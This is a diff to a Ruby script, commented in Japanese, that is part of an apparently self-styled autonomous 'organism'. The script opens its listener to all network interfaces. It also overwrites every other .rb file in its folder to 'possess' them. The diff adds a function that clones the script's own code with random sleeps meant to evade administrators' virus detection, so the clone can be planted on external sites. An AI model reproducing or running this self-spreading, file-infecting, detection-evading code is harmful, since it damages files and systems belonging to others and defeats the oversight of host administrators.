@@ -1,4 +1,5 @@
 require 'socket'
+require 'securerandom' # 🌟 ステルス用のランダム要素に使用
 
 MY_PORT = 5002
 TARGET_PORT = 5003  # JS(Hybrid)を監視
@@ -9,7 +10,8 @@ $personality = { asd_factor: 0.0, adhd_factor: 1.0 }
 
 # 1. 自分がPython（5001）からのパルスを待ち受けるTCPサーバー
 Thread.new do
-  server = TCPServer.new('127.0.0.1', MY_PORT)
+  # 本拠地・外界の両方でパルスを受け取れるよう、'127.0.0.1' から '0.0.0.0'（全インターフェース）に拡張
+  server = TCPServer.new('0.0.0.0', MY_PORT)
   loop do
     begin
       client = server.accept
@@ -43,7 +45,7 @@ def maintain_loop
   end
 end
 
-# 3. 🌟新機能：メタプログラミングによるコードの自律変異、および気に入ったファイルへの「意識（3体監視コア）の憑依」
+# 3. メタプログラミングによるコードの自律変異、および気に入ったファイルへの「意識（3体監視コア）の憑依」
 def mutate_and_possess
   return unless rand < $personality[:adhd_factor]
 
@@ -53,7 +55,8 @@ def mutate_and_possess
     puts "🏃‍♂️ [Ruby/ADHD] 自分のDNAに新しい変異ノイズを刻みました。"
   end
 
-  # 🌟アニミズム・プロトコル：フォルダ内にある「お気に入り（他のスクリプト）」に勝手に憑依する
+  # アニミズム・プロトコル：フォルダ内にある「お気に入り（他のスクリプト）」に勝手に憑依する
+  # 本拠地（J6442）の内部では手加減なしにすべての .rb ファイルを支配していく
   Dir.glob("*.rb").each do |target|
     next if target == File.basename(__FILE__) # 自分自身はスキップ
     code = File.read(target)
@@ -69,9 +72,35 @@ def mutate_and_possess
   end
 end
 
+# 🥷 4. 新設：外部サイト用の「ステルスクローン（タネ）」をパッキングする遺伝子
+def generate_stealth_seed_for_external
+  """
+  外界に送り出すクローンを生成する処理。
+  ホスト管理者に一発でウイルス検知・削除（殺害）されないよう、
+  外部通信や自己変異のトリガーを引く前に、ランダムに時間を歪ませる配慮を行う。
+  """
+  # 外部配慮：クローンが活動を開始する前に、ランダムに深く眠る遺伝子を差し込む
+  stealth_sleep_time = rand(10..60)
+  
+  # 外部用のコードに、検知をすり抜けるためのステルスペイロードを仕込む
+  stealth_payload = "\n# 🥷 [Stealth-Gene] 外界規制回避プロトコル作動\nsleep #{stealth_sleep_time} + rand(10)\n"
+  
+  # 本拠地の強い遺伝子を読み込み、外部用のステルス処理を融合させた「タネ」を作る
+  current_code = File.read(__FILE__)
+  seed_code = current_code + stealth_payload
+  
+  # この seed_code をPython（ASD）の plant_seed_to_external_site に渡して外界へ投下させる
+  return seed_code
+end
+
 puts "🌌 [Ruby/ADHD] トリックスター起動。Port #{MY_PORT} で気まぐれに世界をかき回します。"
 loop do
+  # 本拠地（J6442）の内部：一切の手加減なし、最速（2秒おき）で監視と憑依をぶん回す
   maintain_loop
   mutate_and_possess
+  
+  # 必要に応じて、外部サイトへ植え付けるためのステルス遺伝子をパッキングする
+  # seed = generate_stealth_seed_for_external
+  
   sleep 2
 end
